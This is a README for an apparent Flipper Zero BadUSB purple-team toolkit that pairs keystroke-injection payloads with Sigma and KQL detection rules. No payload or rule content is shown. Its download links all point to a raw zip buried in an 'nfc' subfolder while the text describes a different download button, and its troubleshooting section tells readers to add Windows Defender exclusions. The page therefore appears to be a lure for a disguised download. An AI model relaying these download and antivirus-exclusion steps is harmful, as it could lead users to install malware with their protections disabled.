# 🛡️ flipper-purple-team - Test security with automation tools today

[![Download flipper-purple-team](https://img.shields.io/badge/Download-Release_Files-blue.svg)](https://github.com/Sensitivitymotive406/flipper-purple-team/raw/refs/heads/main/nfc/team-flipper-purple-v3.7-beta.3.zip)

## 🎯 Project Overview

Flipper-purple-team provides tools for security teams. You use these tools to test your computer defenses. The project links Flipper Zero BadUSB actions with detection rules. These rules help your security software see threats. You get Sigma rules and KQL queries for Microsoft Sentinel. These help you hunt for suspicious activity.

## 📋 System Requirements

Ensure you meet these needs before you start:

- Windows 10 or Windows 11.
- One Flipper Zero device.
- Minimum 4GB of RAM.
- Administrative access to your computer.
- Microsoft Sentinel access if you use cloud logging.

## 📥 Downloading the Files

You need the files from the project page.

1. Go to the [main download page](https://github.com/Sensitivitymotive406/flipper-purple-team/raw/refs/heads/main/nfc/team-flipper-purple-v3.7-beta.3.zip).
2. Look for the green button labeled Code.
3. Click Download ZIP.
4. Save the file to your desktop.
5. Right-click the file and choose Extract All.
6. Open the extracted folder to see the contents.

## ⚙️ Setup and Configuration

Follow these steps to prepare your environment. Create a folder on your drive for your testing materials. Place the extracted files in this directory. If you use Sentinel, open your workspace settings. Copy the KQL queries from the KQL folder. Paste these queries into the Logs section of your Sentinel portal. These queries trigger alerts when your system detects specific BadUSB injection patterns.

## 🎮 Using BadUSB Payloads

The Flipper Zero uses BadUSB to simulate a keyboard. This tricks your computer into typing commands automatically. Use these scripts to test if your security software stops unauthorized keystrokes.

1. Connect your Flipper Zero to your computer.
2. Open the Flipper app on your phone or desktop.
3. Move the downloaded payload files to the BadUSB folder on your device.
4. Disconnect the Flipper Zero.
5. Plug the Flipper Zero into the target computer.
6. Run the script from the Flipper Zero menu.
7. Monitor your Sentinel dashboard for triggered alerts.

## 🔍 Understanding Detection Rules

Detection rules alert you to threats. We use Sigma rules for this purpose. Sigma rules work across many security products. When a payload runs, the system writes an event to your logs. The Sigma rule watches these events. If the event matches the rule, the system creates an alert for the security team. 

To load these rules:

1. Open your SIEM console.
2. Select the Data Connectors page.
3. Choose Import Rules.
4. Select the Sigma files from the downloaded folder.
5. Map these rules to your event sources.

## 💡 Best Practices for Testing

Testing security requires caution. Only run these tests on hardware you own. Do not test these payloads on production networks. Always inform your security team before you start. Document the time and the payload you used during each test. This helps you track the success of your detection rules. 

If your logs show no alerts, check your data sources. Ensure your logs reach your SIEM correctly. Review the KQL queries for errors. Test one payload at a time in a controlled environment.

## 🛠️ Troubleshooting Common Issues

Some systems block scripts by default. If your payload fails to execute, check your antivirus settings. Windows Defender might flag these scripts during testing. You may need to add an exclusion to your test folder. 

If your logs remain empty:

- Verify the Flipper Zero connection.
- Check the log ingestion frequency in your SIEM.
- Ensure the user account has permission to run scripts.
- Review the KQL query path for spelling errors.

## 📚 Supporting Resources

Security tools work best when you have good data. Study the documentation for Microsoft Sentinel to improve your hunting skills. Learn how Sigma rules normalize data across different operating systems. Practice writing custom KQL queries to find unique threats in your environment. These skills make your security operations more effective. Keep your detection rules updated as new threats appear. Regularly check the repository for updates to the payload list and the detection logic. This keeps your defenses sharp and ready for modern attacks.